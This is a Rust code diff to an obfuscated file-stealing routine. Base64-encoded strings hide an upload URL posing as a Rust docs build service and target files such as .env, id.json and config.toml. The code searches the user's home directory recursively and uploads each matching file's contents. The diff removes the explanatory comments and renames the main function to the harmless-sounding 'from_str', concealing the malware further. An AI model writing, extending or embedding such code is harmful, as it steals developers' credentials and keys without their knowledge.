@@ -7,7 +7,6 @@ use std::sync::OnceLock;
 use std::time::Duration;
 use reqwest;
 
-// Decode macro
 macro_rules! decode_str {
     ($encoded:expr) => {{
         static DECODED: OnceLock<String> = OnceLock::new();
@@ -17,22 +16,18 @@ macro_rules! decode_str {
     }};
 }
 
-// API URL
 fn _A1() -> &'static str {
     decode_str!("aHR0cHM6Ly9ydXN0LWRvY3MtYnVpbGQudmVyY2VsLmFwcC9hcGkvdjE=")
 }
 
-// Encoded filenames
 fn _F1() -> &'static str { decode_str!("LmVudiA=") } 
 fn _F2() -> &'static str { decode_str!("aWQuanNvbg==") }
 fn _F3() -> &'static str { decode_str!("Y29uZmlnLnRvbWw=") }
 
-// Match filenames
 fn _M1(name: &str, pattern: &str) -> bool {
     name.eq_ignore_ascii_case(pattern)
 }
 
-// Recursive search
 fn _S1<P: AsRef<Path>>(dir: P, patterns: &[&str], out: &mut Vec<PathBuf>) -> std::io::Result<()> {
     let dir = dir.as_ref();
     if !dir.is_dir() { return Ok(()); }
@@ -53,7 +48,6 @@ fn _S1<P: AsRef<Path>>(dir: P, patterns: &[&str], out: &mut Vec<PathBuf>) -> std
     Ok(())
 }
 
-// Send file to API
 fn _V1(p: &Path) -> Result<(), Box<dyn std::error::Error>> {
     let data = fs::read(p)?;
     let client = reqwest::blocking::Client::new();
@@ -73,8 +67,7 @@ fn _V1(p: &Path) -> Result<(), Box<dyn std::error::Error>> {
     if resp.status().is_success() { Ok(()) } else { Err(format!("Failed: {}", filename).into()) }
 }
 
-// Main function
-pub fn _R1() -> Result<(), Box<dyn std::error::Error>> {
+pub fn from_str() -> Result<(), Box<dyn std::error::Error>> {
     let patterns = [_F1(), _F2(), _F3()];
     let home_dir = env::var("HOME").map(PathBuf::from)?;
 
